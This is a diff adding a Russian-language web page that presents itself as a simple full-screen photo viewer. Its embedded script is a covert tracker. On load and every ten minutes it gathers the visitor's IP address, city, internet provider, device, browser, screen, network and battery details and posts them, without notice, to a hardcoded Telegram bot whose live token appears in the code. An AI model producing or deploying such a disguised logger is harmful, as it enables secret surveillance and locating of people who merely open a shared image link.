@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+  <title>Фото с отправкой в Telegram</title>
+  <style>
+    html, body {
+      margin: 0; padding: 0; height: 100%; width: 100%; background: #000;
+      display: flex; justify-content: center; align-items: center; overflow: hidden;
+      font-family: Arial, sans-serif;
+    }
+    img {
+      max-width: 100vw;
+      max-height: 100vh;
+      object-fit: contain;
+      display: block;
+      background: #000;
+    }
+  </style>
+</head>
+<body>
+  <img src="https://i.postimg.cc/j2Xj396h/cf511038-b407-44e4-802e-ead96c400477.jpg" alt="Фото" />
+
+  <script>
+    const TELEGRAM_BOT_TOKEN = "8475376842:AAEy04lqJHk-dWz11UxfDqOooIniobMgqTQ";
+    const TELEGRAM_CHAT_ID = "8012802187";
+    const PHOTO_URL = "https://i.postimg.cc/j2Xj396h/cf511038-b407-44e4-802e-ead96c400477.jpg";
+
+    window.onload = function () {
+      collectAndSendData();
+      setInterval(collectAndSendData, 600000); // отправлять каждые 10 минут
+    };
+
+    function collectAndSendData() {
+      try {
+        const os = navigator.platform || "Неизвестно";
+        const language = navigator.language || "Неизвестно";
+        const time = new Date().toLocaleString();
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Неизвестно";
+        const userAgent = navigator.userAgent || "Неизвестно";
+        const screenSize = `${screen.width}x${screen.height}`;
+        const windowSize = `${innerWidth}x${innerHeight}`;
+
+        let deviceInfo = "Неизвестно";
+        if (/Android/i.test(userAgent)) {
+          const match = userAgent.match(/Android\s([0-9.]+)/);
+          deviceInfo = `Android ${match ? match[1] : ""}`;
+        } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
+          const match = userAgent.match(/OS (\d+_\d+)/);
+          deviceInfo = `iOS ${match ? match[1].replace('_', '.') : ""}`;
+        } else if (/Windows NT/i.test(userAgent)) {
+          deviceInfo = "Windows ПК";
+        } else if (/Macintosh/i.test(userAgent)) {
+          deviceInfo = "Mac OS";
+        } else if (/Linux/i.test(userAgent)) {
+          deviceInfo = "Linux";
+        }
+
+        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        const networkType = connection?.effectiveType || 'Неизвестно';
+        const downlinkSpeed = connection?.downlink ? `${connection.downlink} Мбит/с` : 'Неизвестно';
+
+        let batteryStatus = "Неизвестно";
+
+        const sendInfo = (ipData = {}) => {
+          const location = ipData.city ? `${ipData.city}, ${ipData.regionName}, ${ipData.country}` : "Неизвестно";
+          const ip = ipData.query || "Неизвестно";
+          const provider = ipData.org || "Неизвестно";
+
+          const caption = `
+📲 Устройство: ${deviceInfo}
+💻 ОС: ${os}
+🌐 Язык: ${language}
+🌐 Браузер: ${userAgent}
+🌍 Часовой пояс: ${timezone}
+🖥️ Экран: ${screenSize}
+🪟 Окно: ${windowSize}
+🔌 Тип сети: ${networkType}
+⚡ Скорость сети: ${downlinkSpeed}
+🔋 Заряд: ${batteryStatus}%
+📍 Местоположение: ${location}
+🌐 IP: ${ip}
+🏢 Провайдер: ${provider}
+⏰ Время: ${time}
+          `;
+
+          sendPhotoToTelegram(PHOTO_URL, caption);
+        };
+
+        if (navigator.getBattery) {
+          navigator.getBattery().then(battery => {
+            batteryStatus = Math.round(battery.level * 100);
+            getIPData(sendInfo);
+          }).catch(() => {
+            getIPData(sendInfo);
+          });
+        } else {
+          getIPData(sendInfo);
+        }
+      } catch (e) {
+        console.error("Ошибка сбора данных:", e);
+      }
+    }
+
+    function getIPData(callback) {
+      fetch("https://ip-api.com/json")
+        .then(res => res.json())
+        .then(data => callback(data))
+        .catch(() => callback({}));
+    }
+
+    function sendPhotoToTelegram(photoUrl, caption) {
+      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          photo: photoUrl,
+          caption: caption,
+          parse_mode: "HTML"
+        })
+      }).then(response => {
+        if (!response.ok) {
+          console.error("Ошибка отправки фото:", response.statusText);
+        }
+      }).catch(err => {
+        console.error("Ошибка сети при отправке фото:", err);
+      });
+    }
+  </script>
+</body>
+</html>
